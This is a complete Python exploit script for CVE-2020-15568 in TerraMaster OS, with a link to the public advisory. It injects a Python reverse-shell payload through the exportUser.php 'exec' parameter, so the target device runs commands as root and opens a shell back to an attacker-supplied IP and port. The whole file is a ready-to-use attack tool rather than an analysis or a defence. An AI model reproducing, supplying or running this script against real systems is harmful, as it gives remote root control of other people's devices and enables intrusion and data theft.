import requests, sys

# CVE-2020-15568
# https://ssd-disclosure.com/ssd-advisory-terramaster-os-exportuser-php-remote-code-execution/

# eg: http://{target}/include/exportUser.php?type=3&cla=application&fun=exec&opt={cmd}
# The request forces exportUser.php to create a new instance of “application” class and call it’s public method “exec” to execute code as root.

def main():
	if len(sys.argv) != 4:
		print("(+) Usage %s <target IP> <attacker IP> <attacker port>" % sys.argv[0])
		sys.exit(1)

	target = sys.argv[1]
	attackerIP = sys.argv[2]
	attackerPort = sys.argv[3]

	# Classic python rev shell
	# May need to change depending on what is available on the system.
	payload = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" % (attackerIP, attackerPort)
	exploitURL = 'http://%s/include/exportUser.php?type=3&cla=application&fun=exec&opt=%s' % (target,payload)

	print("[*] Sending Exploit....")
	r = requests.get(exploitURL)
	print("[*] Be sure to check your listener!")

if __name__ == '__main__':
	main()
